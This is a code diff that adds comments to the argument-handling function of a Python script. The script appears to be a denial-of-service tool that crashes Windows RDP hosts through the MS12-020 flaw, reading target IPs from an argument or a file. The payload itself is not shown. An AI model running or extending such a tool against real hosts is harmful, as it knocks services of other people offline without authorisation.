@@ -290,14 +290,17 @@ def do_dos(ip: str, port: int):
         print(f'{Fore.GREEN + Style.BRIGHT}[+]{Style.RESET_ALL} {ip}:{port} seems down! Target successfully crashed via MS12-020.')
 
 def main():
+    # validate arguments
     if not ((args.ip or args.file) and args.port):
         parser.print_help()
         sys.exit(1)
 
-    ip_objs = []
-    port = int(args.port)
+    ip_objs = []            # target IP addresses
+    port = int(args.port)   # target port
 
     if args.file:
+        # # use hosts from the input file?
+
         if not os.path.exists(args.file):
             print(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} Cannot find file: {args.file}')
             return
@@ -306,6 +309,7 @@ def main():
         
         print(f'{Fore.BLUE + Style.BRIGHT}[*]{Style.RESET_ALL} Loaded file: {args.file}, hosts = {len(ip_objs)}')
     elif args.ip:
+        #
         ip_objs.append(args.ip)
     else:
         parser.print_help()
